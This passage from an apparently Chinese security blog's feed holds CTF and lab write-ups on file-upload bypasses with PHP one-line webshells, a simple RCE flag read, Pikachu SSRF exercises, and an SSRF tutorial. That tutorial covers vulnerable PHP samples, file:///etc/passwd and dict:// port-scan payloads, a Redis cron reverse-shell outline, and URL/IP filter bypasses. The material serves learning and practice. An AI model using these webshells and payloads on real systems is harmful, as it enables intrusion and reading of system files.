src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/upload_file/image-20231201152127655.png" alt="image-20231201152127655"></p><p>他这里开始了内容检查，我们上传不带<code>&lt;?</code></p><p>也就是使用php+html形式</p><p><strong>0x05</strong></p><p>绕过<code>&lt;?</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php+html">GIF89a?<br>&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[value])&lt;/script<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/upload_file/image-20231201152622012.png" alt="image-20231201152622012"></p><p><strong>0x06</strong></p><p>然后就是连接</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/upload_file/image-20231201153024703.png" alt="image-20231201153024703"></p><p>测试出路径为&#x2F;upload</p><h2 id="攻防世界-easyupload"><a href="#攻防世界-easyupload" class="headerlink" title="[攻防世界]easyupload"></a>[攻防世界]easyupload</h2><p><strong>0x00</strong>  前菜</p><p>这道题挺有趣的，首先</p><p>可以尝试上传文件，这个是文件内容的检测，所以需要将一句话木马变成下面这个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>phP <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我以为游戏结束了，没想到，这个文件不能访问</p><p><strong>0x01</strong>  .htaccess &amp;&amp; .user.ini</p><blockquote><p>.htaccess 这个是apache的配置文件，可以解析图片为php</p><p> .user.ini 与htaccess 类似，但是用的会普遍一点</p></blockquote><p>这里上传**.htaccess** 不行，所以上传.user.ini试试</p><blockquote><p>auto_prepend_file &#x3D; 1.png</p></blockquote><p>这个就是说，与.user.ini同一个目录下的文件都会包含1.png文件</p><p>如果我们在png里面放置木马就会执行这个木马</p><p>那就直接上传.user.ini文件，然后再上传1.png文件</p><p><strong>0x02</strong>  重要</p><p>最重要的是，当前目录之下必须要有php文件，因为没有文件的话，就不能执行1.png</p><p>注意连接的时候也是访问，当前目录的php文件，因为文件本生还是不具有执行权限</p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="SWPUCTF-2021-新生赛-easyrce"><a href="#SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]easyrce"></a>[SWPUCTF 2021 新生赛]easyrce</h2><p><strong>0X00 被坑了</strong></p><p>这道题看见了eval()函数，这个函数可以把字符串当做php代码执行，但是….</p><p><a href="https://www.runoob.com/php/func-misc-eval.html">PHP eval() 函数 | 菜鸟教程 (runoob.com)</a></p><p><strong>0x01  system &amp;&amp; shell_eval</strong></p><p>直接尝试运行代码，读取flag</p><blockquote><p>cat &#x2F;f*</p></blockquote><p>但是这个时候我是用shell_eval()没有任何反应</p><p>当我开始迷茫的时候尝试使用system()执行，出答案</p><p><strong>0x02  区别</strong></p><blockquote><p>shell_exec() 将执行结果当作返回值，并不会主动输出，而是赋值给变量</p></blockquote><blockquote><p>system() 执行命令，并输出到浏览器</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>CTF刷题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pikachu</title>
    <link href="/2023/11/30/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/pikachu/"/>
    <url>/2023/11/30/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/pikachu/</url>
    
    <content type="html"><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="CURL"><a href="#CURL" class="headerlink" title="CURL"></a>CURL</h2><p>0x01</p><p>先来了解一下curl</p><blockquote><p>PHP支持的由Daniel Stenberg创建的libcurl库允许你与各种的服务器使用各种类型的协议进行连接和通讯。</p><p>libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。</p><p>PHP中使用cURL实现Get和Post请求的方法</p><p>这些函数在PHP 4.0.2中被引入。</p></blockquote><p>0x02</p><p>利用file协议，读取任意文件</p><blockquote><p><a href="http://192.168.87.166/pikachu/vul/ssrf/ssrf_curl.php?url=file:///c:/windows/win.ini">http://192.168.87.166/pikachu/vul/ssrf/ssrf_curl.php?url=file:///c:/windows/win.ini#</a></p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/pikachu/image-20231130002234080.png" alt="image-20231130002234080"></p><p>0x03</p><p>dict协议扫描内网主机开放端口</p><blockquote><p>url&#x3D;dict:&#x2F;&#x2F;192.168.198.1:21</p></blockquote><p>0x04</p><p>直接访问指定的url</p><blockquote><p>url&#x3D;<a href="http://www.baidu.com/">www.baidu.com</a></p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/pikachu/image-20231130002620090.png" alt="image-20231130002620090"></p><h2 id="file-get-content"><a href="#file-get-content" class="headerlink" title="file_get_content"></a>file_get_content</h2><p>0x01</p><p>使用file</p><blockquote><p>file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini</p></blockquote><p>0x02</p><p>http</p><blockquote><p>file&#x3D;<a href="http://www.baidu.com/">http://www.baidu.com</a></p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/pikachu/image-20231130003053296.png" alt="image-20231130003053296"></p>]]></content>
    
    
    
    <tags>
      
      <tag>靶场记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2023/11/28/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/SSRF/"/>
    <url>/2023/11/28/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/SSRF/</url>
    
    <content type="html"><![CDATA[<h1 id="SSRF是什么"><a href="#SSRF是什么" class="headerlink" title="SSRF是什么"></a>SSRF是什么</h1><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p><h1 id="SSRF漏洞原理"><a href="#SSRF漏洞原理" class="headerlink" title="SSRF漏洞原理"></a>SSRF漏洞原理</h1><p>可以理解为，服务器可以从其他的服务器获取信息。然而却没有对这个服务器的地址做限制</p><p>就比如说，我们可以指定一个有缺陷的url，或者自己的作为外部服务器。</p><h1 id="SSRF漏洞挖掘"><a href="#SSRF漏洞挖掘" class="headerlink" title="SSRF漏洞挖掘"></a>SSRF漏洞挖掘</h1><h2 id="分享"><a href="#分享" class="headerlink" title="分享"></a>分享</h2><p>通过URL分享网页的内容</p><h2 id="转码"><a href="#转码" class="headerlink" title="转码"></a>转码</h2><p>通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览:由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务</p><h2 id="翻译"><a href="#翻译" class="headerlink" title="翻译"></a>翻译</h2><p>通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道</p><h2 id="图片、文章收藏功能"><a href="#图片、文章收藏功能" class="headerlink" title="图片、文章收藏功能"></a>图片、文章收藏功能</h2><p>处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载。</p><blockquote><p><a href="http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</a></p></blockquote><p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF</p><h2 id="未公开的api实现以及其他调用URL的功能"><a href="#未公开的api实现以及其他调用URL的功能" class="headerlink" title="未公开的api实现以及其他调用URL的功能"></a>未公开的api实现以及其他调用URL的功能</h2><h2 id="图片加载与下载"><a href="#图片加载与下载" class="headerlink" title="图片加载与下载"></a>图片加载与下载</h2><p>通过URL地址加载或下载图片，图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示</p><h2 id="URL关键字中寻找"><a href="#URL关键字中寻找" class="headerlink" title="URL关键字中寻找"></a>URL关键字中寻找</h2><blockquote><p>share<br>wap<br>url<br>link<br>src<br>source<br>target<br>u<br>display<br>sourceURl<br>imageURL<br>domain</p></blockquote><h2 id="产生SSRF的相关函数"><a href="#产生SSRF的相关函数" class="headerlink" title="产生SSRF的相关函数"></a>产生SSRF的相关函数</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><ol><li><p>file_get_contents</p><p>将整个文件读入到字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) <br>&#123; <br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]); <span class="hljs-comment">//获取用户输入的url</span><br><span class="hljs-variable">$filename</span> =<span class="hljs-string">&#x27;./images/&#x27;</span>.<span class="hljs-title function_ invoke__">rand</span>().<span class="hljs-string">&#x27;;img1.jpg&#x27;</span>;  <span class="hljs-comment">//蒋文件储存为为一个</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span>);  <span class="hljs-comment">//将获取的内容写入文件</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]; <span class="hljs-comment">//输出用户输入的url</span><br><span class="hljs-variable">$img</span> = <span class="hljs-string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot;\&quot;/&gt;&quot;</span>; <span class="hljs-comment">//输出图片</span><br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$img</span>; <br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure></li><li><p>sockopen</p><p>以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetFile</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$link</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>); <span class="hljs-comment">// 使用fsockopen函数建立与指定主机和端口的连接，设置超时时间为30秒</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (错误号 <span class="hljs-subst">$errno</span>) \n&quot;</span>; <span class="hljs-comment">// 如果连接失败，输出错误信息</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-subst">$link</span> HTTP/1.1\r\n&quot;</span>; <span class="hljs-comment">// 构建HTTP GET请求头，使用HTTP/1.1协议，这对于保持连接很重要</span><br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>; <span class="hljs-comment">// 添加主机信息到请求头</span><br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <span class="hljs-comment">// 添加连接关闭信息到请求头</span><br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <span class="hljs-comment">// 添加空行，表示请求头结束</span><br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <span class="hljs-comment">// 发送请求头到服务器</span><br>        <span class="hljs-variable">$contents</span> = <span class="hljs-string">&#x27;&#x27;</span>; <span class="hljs-comment">// 初始化内容变量</span><br>        <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123;<br>            <span class="hljs-variable">$contents</span> .= <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">1024</span>); <span class="hljs-comment">// 逐行读取服务器响应内容并添加到内容变量</span><br>        &#125;<br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>); <span class="hljs-comment">// 关闭连接</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>; <span class="hljs-comment">// 返回获取的内容</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>curl_exec</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$link</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$curlobj</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_POST, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>,CURLOPT_URL,<span class="hljs-variable">$link</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curlobj</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curlobj</span>);<br> <br><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;./curled/&#x27;</span>.<span class="hljs-title function_ invoke__">rand</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$result</span>); <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure></li><li><p>curl_exec</p><p>关于curl</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 检查是否设置了POST请求中的&#x27;url&#x27;参数</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$link</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]; <span class="hljs-comment">// 获取POST请求中的&#x27;url&#x27;参数值</span><br><br>    <span class="hljs-variable">$curlobj</span> = <span class="hljs-title function_ invoke__">curl_init</span>(); <span class="hljs-comment">// 初始化一个cURL会话</span><br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_POST, <span class="hljs-number">0</span>); <span class="hljs-comment">// 设置cURL请求为GET请求</span><br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_URL, <span class="hljs-variable">$link</span>); <span class="hljs-comment">// 设置要访问的URL</span><br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>); <span class="hljs-comment">// 设置cURL执行后不直接输出结果，而是返回到变量中</span><br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curlobj</span>); <span class="hljs-comment">// 执行cURL请求并将结果保存到$result变量</span><br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curlobj</span>); <span class="hljs-comment">// 关闭cURL会话</span><br><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;./curled/&#x27;</span> . <span class="hljs-title function_ invoke__">rand</span>() . <span class="hljs-string">&#x27;.txt&#x27;</span>; <span class="hljs-comment">// 生成一个随机文件名</span><br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$result</span>); <span class="hljs-comment">// 将cURL获取的结果保存到文件中</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>; <span class="hljs-comment">// 输出cURL获取的结果</span><br>&#125;<br><br></code></pre></td></tr></table></figure></li></ol><h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><blockquote><p>仅支持 HTTP&#x2F;HTTPS 协议的类：HttpClient 类、HttpURLConnection 类、 OkHttp 类、 Request</p><p>类</p><p>支持 sun.net.<a href="http://www.protocol/">www.protocol</a> 所有协议的类：URLConnection 类、URL 类、ImageIO 类</p></blockquote><h1 id="SSRF中URL的伪协议"><a href="#SSRF中URL的伪协议" class="headerlink" title="SSRF中URL的伪协议"></a>SSRF中URL的伪协议</h1><blockquote><p>file:&#x2F;&#x2F;&#x2F; 从文件系统中获取文件内容，如，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>dict:&#x2F;&#x2F; 字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info：<br>sftp:&#x2F;&#x2F; SSH文件传输协议或安全文件传输协议<br>ldap:&#x2F;&#x2F; 轻量级目录访问协议<br>tftp:&#x2F;&#x2F; 简单文件传输协议<br>gopher:&#x2F;&#x2F; 分布式文档传递服务，可使用gopherus生成payload</p></blockquote><h1 id="SSRF漏洞利用（危害）"><a href="#SSRF漏洞利用（危害）" class="headerlink" title="SSRF漏洞利用（危害）"></a>SSRF漏洞利用（危害）</h1><h2 id="读取敏感文件"><a href="#读取敏感文件" class="headerlink" title="读取敏感文件"></a>读取敏感文件</h2><ol><li><p>使用file协议读取文件内容</p><blockquote><p>file:&#x2F;&#x2F;</p></blockquote><blockquote><p>本地文件传输协议，用于读取本地计算机里面的文件。</p><p>就像是使用win里面的打开或者右键打开</p></blockquote><ul><li><p>读取&#x2F;etc&#x2F;password</p><blockquote><p>在Linux 中 &#x2F;etc&#x2F;passwd文件中每个用户都有一个对应的记录行，它记录了这个用户的一些基本属性。</p><p>系统管理员经常会接触到这个文件的修改以完成对用户的管理工作。</p></blockquote></li><li><p>读取&#x2F;etc&#x2F;host</p><blockquote><p>hosts文件主要作用是定义IP地址和主机名的映射关系，是一个映射IP地址和主机名的规定。可以用文</p><p>本文件打开！当用户在浏览器中输入一个网址时，系统会首先自动从hosts文件中寻找对应的IP地址，</p><p>一旦找到，浏览器会立即打开对应网页，如果没有找到，则浏览器会将网址提交DNS服务器进行IP地址解析。简单来说就是负责ip地址与域名快速解析的文件，读取文件可以得到内网所在网段。</p><p>可以理解为这个是本地的DNS解析器</p></blockquote></li></ul></li></ol><h2 id="探测内网的服务"><a href="#探测内网的服务" class="headerlink" title="探测内网的服务"></a>探测内网的服务</h2><ol><li><p>使用dict协议</p><blockquote><p>dict:&#x2F;&#x2F;</p></blockquote><blockquote><p>dict 协议是一个在线网络字典协议，这个协议是用来架设一个字典服务的。不过用的比较</p><p>少，所以网上基本没啥资料（包括谷歌上）。在SSRF漏洞利用中，常常用来探测内网的应用信息</p></blockquote></li></ol><h2 id="攻击内网应用"><a href="#攻击内网应用" class="headerlink" title="攻击内网应用"></a>攻击内网应用</h2><ol><li><p>通过dict:&#x2F;&#x2F;协议攻击redis</p><p>可以导致任意用户利用ssrf漏洞攻击内网中的未授权Redis以及读取Redis的数据。</p><p>攻击者在未授权访问Redis的情况下可以利用Redis的相关方法，如果运行 redis 的用户是 root 用户，攻击者可以通过写定时任务的方式进行反弹shell。</p><p>测试是否存在漏洞</p><blockquote><p>dcit:&#x2F;&#x2F;ip:port&#x2F;info</p></blockquote><p>写定时任务</p><p>写定时任务的目录</p><blockquote><p>centos，在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;目录下</p><p>ubuntu 的定时任务在 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F; 目录下</p></blockquote><p>可以根据服务器是否存在以下文件判断服务器的信息</p><blockquote><p># Centos</p><p>&#x2F;etc&#x2F;redhat-release</p><p># Ubuntu</p><p>&#x2F;etc&#x2F;lsb-release</p></blockquote></li></ol><h1 id="SSRF中url解码编码"><a href="#SSRF中url解码编码" class="headerlink" title="SSRF中url解码编码"></a>SSRF中url解码编码</h1><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>现在我们有一个url是:</p><blockquote><p><a href="http://ip:host/xxx">http://ip:host/xxx</a></p></blockquote><p>如果现在<code>xxx</code>里含有<code>%xx</code>格式，这个数据先是被接受之后才会被解码</p><h2 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h2><p>还是这个url</p><blockquote><p><a href="http://ip:host/xxx">http://ip:host/xxx</a></p></blockquote><p>如果xxx里面含有%xx格式的数据，那么会在发送方就处理成接收方接受的数据</p><h1 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h1><ul><li><p>有回显：页面有返回具体内容。</p></li><li><p>无回显：页面没有返回具体内容</p></li></ul><h1 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h1><h2 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h2><p>ctfhub  技能树</p><blockquote><p><a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p></blockquote><h2 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h2><p><strong>伪协议:</strong></p><blockquote><p>类型<br>file:&#x2F;&#x2F;&#x2F;<br>dict:&#x2F;&#x2F;<br>sftp:&#x2F;&#x2F;<br>ldap:&#x2F;&#x2F;<br>tftp:&#x2F;&#x2F;<br>gopher:&#x2F;&#x2F;</p></blockquote><p>这里使用ctfhub技能树的题做演示</p><blockquote><p>file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p></blockquote><p>注意这个是web目录</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>端口扫描使用的是<code>dict://</code>协议</p><p>但是请你注意，我们使用dict扫描出端口之后，需要使用url直接访问，而不是继续使用dict协议</p><p>下面是做题逻辑，他说了端口在8000~9000，直接使用bp扫</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130140802475.png" alt="image-20231130140802475"></p><p>访问：</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130141033863.png" alt="image-20231130141033863"></p><blockquote><p><a href="http://challenge-a30959492eed8566.sandbox.ctfhub.com:10800/?url=127.0.0.1:8017">http://challenge-a30959492eed8566.sandbox.ctfhub.com:10800/?url=127.0.0.1:8017</a></p></blockquote><h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><p>这次还是使用ctfhub 的技能树作为例子</p><p>题目是：</p><blockquote><p>这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</p></blockquote><p>要求我们发一个POST请求包，但是这个发包需要利用gopher协议</p><p>首先我们可以利用index.php的url访问flag.php和index.php</p><h2 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h2><p>ctfhub技能树里面的一道题</p><p>打开过后发现必须带有</p><blockquote><p><a href="http://notfound.ctfhub.com/">http://notfound.ctfhub.com</a></p></blockquote><p>这里我们需要知道一个东西</p><blockquote><p><a href="http://www.baidu.com@192.168.0.1/">http://www.baidu.com@192.168.0.1/</a></p></blockquote><p>请求的都是192.168.0.1里面的内容</p><p>是所以我们直接构造</p><blockquote><p><a href="http://challenge-a1e077f43b569033.sandbox.ctfhub.com:10800/?url=http://notfound.ctfhub.com@127.0.0.1/flag.php">challenge-a1e077f43b569033.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;http:&#x2F;&#x2F;notfound.ctfhub.com@127.0.0.1/flag.php</a></p></blockquote><h2 id="IP-Bypass"><a href="#IP-Bypass" class="headerlink" title="IP Bypass"></a>IP Bypass</h2><p>这道题我觉得比较鸡贼，因为他会有到你想ip，ban掉了127&#x2F;172</p><p>但是我们有一个回环地址localhost</p><p>所以直接构造poc</p><blockquote><p>?url&#x3D;localhost&#x2F;flag.php</p></blockquote><h2 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h2><p>不知道这个怎么回事，我尝试在http添加Localtion字段发现没有什么用，直接访问这个就没有问题</p><blockquote><p>?url&#x3D;localhost&#x2F;flag.php</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>基础漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE_2021_27905_Apache_Solr</title>
    <link href="/2023/11/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-27905-Apache-Solr/"/>
    <url>/2023/11/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-27905-Apache-Solr/</url>
    
